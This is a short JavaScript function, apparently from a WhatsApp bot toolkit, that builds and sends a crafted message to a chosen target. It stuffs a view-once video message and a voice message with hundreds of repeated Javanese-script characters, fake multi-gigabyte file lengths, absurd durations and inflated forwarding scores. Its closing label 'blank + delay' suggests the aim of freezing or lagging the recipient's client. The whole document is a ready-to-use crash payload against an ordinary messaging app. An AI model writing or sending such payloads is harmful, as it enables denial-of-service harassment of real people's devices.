async function AudioXDellay(sock, target) {
  const msg = {
    to: target,
    message: {
      viewOnceMessage: {
        message: {
          videoMessage: {
            caption: "꧔꧈".repeat(600),
            mimetype: "video/mp4",
            fileName: "𝐀𝐦𝐞𝐥𝐢𝐚𝐚𝐎𝐯𝐞𝐫𝐥𝐨𝐚𝐝", 
            fileLength: "9999999999",
            seconds: 999999,
            mediaKey: "v/J9vWyG92CnR0fqagJ7GBxQzmDG3+cV+DBL1yyECBI=",
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true
            }
          }
        }
      },
      audioMessage: {
        mimetype: "audio/ogg; codecs=opus",
        ptt: true,
        seconds: 9999,
        fileName: "𝐀𝐦𝐞𝐥𝐢𝐚 𝐎𝐯𝐞𝐫𝐥𝐨𝐚𝐝" + "꧔꧈".repeat(500),
        fileLength: "9999999999",
        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=", 
        contextInfo: {
          forwardingScore: 9999,
          isForwarded: true,
          mentionedJid: [
            ...Array.from({ length: 1 }, () =>
              `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
            )
          ]
        }
      }
    }
  };

  await sock.sendMessage(msg.to, msg.message);
}

blank + delay
